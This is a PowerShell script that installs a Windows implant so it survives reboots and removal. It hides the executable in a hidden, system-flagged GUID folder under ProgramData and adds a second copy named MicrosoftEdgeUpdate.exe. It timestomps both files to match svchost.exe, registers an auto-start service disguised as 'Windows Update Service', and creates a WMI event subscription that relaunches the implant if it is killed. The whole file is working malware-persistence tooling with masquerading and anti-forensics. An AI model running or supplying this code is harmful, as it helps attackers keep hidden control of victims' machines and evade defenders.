# durable.ps1 — T3 durable persistence for a Windows implant/service exe.
#
# - hidden, plausible path under C:\ProgramData\<GUID>\ (Hidden+System)
# - second copy under a signed-looking name
# - file timestamps stomped to match a sibling system binary
# - service (auto-start) AND a WMI __EventFilter/__EventConsumer subscription
#
# Requires an elevated (SYSTEM/Administrator) context.
# usage: powershell -ExecutionPolicy Bypass -File durable.ps1 -ExePath C:\path\svc.exe [-ServiceName WinUpdateSvc]
param(
    [Parameter(Mandatory = $true)][string]$ExePath,
    [string]$ServiceName = "WinUpdateSvc"
)

$ErrorActionPreference = "Continue"

$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    Write-Error "durable.ps1 requires Administrator/SYSTEM (SeDebugPrivilege)"
    exit 2
}

$id = [guid]::NewGuid().ToString()
$dir = Join-Path $env:ProgramData $id
New-Item -ItemType Directory -Force -Path $dir | Out-Null

$dest = Join-Path $dir "$ServiceName.exe"
$signed = Join-Path $dir "MicrosoftEdgeUpdate.exe"
Copy-Item -LiteralPath $ExePath -Destination $dest -Force
Copy-Item -LiteralPath $dest -Destination $signed -Force

foreach ($p in @($dest, $signed)) {
    if (Test-Path -LiteralPath $p) {
        try { (Get-Item -LiteralPath $p).Attributes = [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::System -bor [IO.FileAttributes]::Archive } catch { }
        try {
            $src = Get-Item (Join-Path $env:WINDIR "System32\svchost.exe")
            $i = Get-Item -LiteralPath $p
            $i.CreationTimeUtc = $src.CreationTimeUtc
            $i.LastWriteTimeUtc = $src.LastWriteTimeUtc
            $i.LastAccessTimeUtc = $src.LastAccessTimeUtc
        } catch { }
    }
}
try { (Get-Item -LiteralPath $dir).Attributes = [IO.FileAttributes]::Hidden -bor [IO.FileAttributes]::System -bor [IO.FileAttributes]::Directory } catch { }

# persistence path 1: Windows service (auto-start)
$exists = sc.exe query $ServiceName 2>$null | Select-String "SERVICE_NAME"
if (-not $exists) {
    sc.exe create $ServiceName binPath= "`"$dest`"" start= auto DisplayName= "Windows Update Service" | Out-Null
}
sc.exe description $ServiceName "Windows Update Service" | Out-Null
sc.exe start $ServiceName | Out-Null

# persistence path 2: WMI permanent event subscription (relaunch if killed)
try {
    $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
        Name           = "Flt$id"
        EventNamespace = "root\cimv2"
        QueryLanguage  = "WQL"
        Query          = "SELECT * FROM __InstanceDeletionEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='$ServiceName.exe'"
    }
    $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
        Name                = "Con$id"
        CommandLineTemplate = "`"$dest`""
    }
    Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
        Filter   = $filter
        Consumer = $consumer
    } | Out-Null
    Write-Output "wmi subscription: Flt$id / Con$id"
} catch {
    Write-Output "wmi subscription failed: $($_.Exception.Message)"
}

Write-Output "durable installed:"
Write-Output "  path:    $dest"
Write-Output "  copy:    $signed"
Write-Output "  service: $ServiceName (auto-start)"
whoami /priv | Select-String "SeDebugPrivilege"
